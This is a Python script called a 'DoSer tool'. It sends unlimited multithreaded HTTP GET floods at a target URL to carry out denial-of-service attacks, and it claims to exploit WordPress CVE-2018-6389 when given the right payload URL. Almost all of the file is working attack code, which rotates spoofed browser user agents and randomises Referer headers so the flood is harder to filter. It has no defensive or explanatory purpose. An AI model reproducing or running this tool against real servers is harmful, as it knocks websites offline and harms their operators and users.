# Title: DoSer tool
# Author: Alessio Gilardi

# The tool sends tons of http GET request to a server in order to perform DoS attacks
# Prividing correct payload it can exploit vulnerability of Wordpress CVE-2018-6389
# Usage: mydoser_get.py [-h] [-t THREADS] [-u URL]


import requests
import sys
import threading
import random
import os
import argparse

request_counter = 0
headers_useragents = []

printed_messages = []

TOO_MANY_REQUESTS = 429
INTERNAL_SERVER_ERROR = 500
CONNECTION_RESET_BY_PEER = 104

MAX_REQUESTS = 5000000

def print_message(message):
    if message not in printed_messages:
        print '\n' + message + ' after %i requests' %request_counter
        printed_messages.append(message)

def random_string(size):
    out_str = ''
    for i in range(size):
        c = random.randint(65, 90)
        out_str += chr(c)
    return out_str

def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return headers_useragents

def generate_headers():
    useragent_list()
    global headers_useragents
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'http://www.google.com/?q=' + random_string(random.randint(5,10)),
        'Keep-Alive': str(random.randint(110,120)),
        'Connection': 'keep-alive'
    }

    return headers

def handle_status_code(status_code):
    global request_counter
    sys.stdout.write('\r%i requests has been sent' % request_counter)
    sys.stdout.flush()
    if status_code == TOO_MANY_REQUESTS:
        print_message('Error 429: Too Many Requests')
    elif status_code == INTERNAL_SERVER_ERROR:
        print_message('Error 500: Internal Server Error')
    elif status_code == CONNECTION_RESET_BY_PEER:
        print_message('Error 104: Connection Reset By Peer')

def send_GET_request(url):
    global request_counter
    if request_counter == MAX_REQUESTS:
        os._exit(1)
    headers = generate_headers()
    try:
        request_counter += 1
        request = requests.get(url, headers = headers)
        handle_status_code(request.status_code)
    except:
        pass

class SendGETRequestThread(threading.Thread):
    def __init__(self, id, name, url):
        threading.Thread.__init__(self)
        self.id = id
        self.name = name
        self.url = url
    def run(self):
        while True:
            send_GET_request(self.url)

def main(argv):
    parser = argparse.ArgumentParser(description='Sending unlimited requests to perform DoS attack.')
    parser.add_argument('-t', '--threads', help='Specify number of threads to be used', default=500, type=int)
    parser.add_argument('-u', '--url', help = 'Specify the explitable URL. Usage: -u | --url \'<url>\'')
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    if args.url:
        for i in range(args.threads):
            t = SendGETRequestThread(i, 'Thread-%i' % i, args.url)
            t.start()

if __name__ == "__main__":
   main(sys.argv[1:])
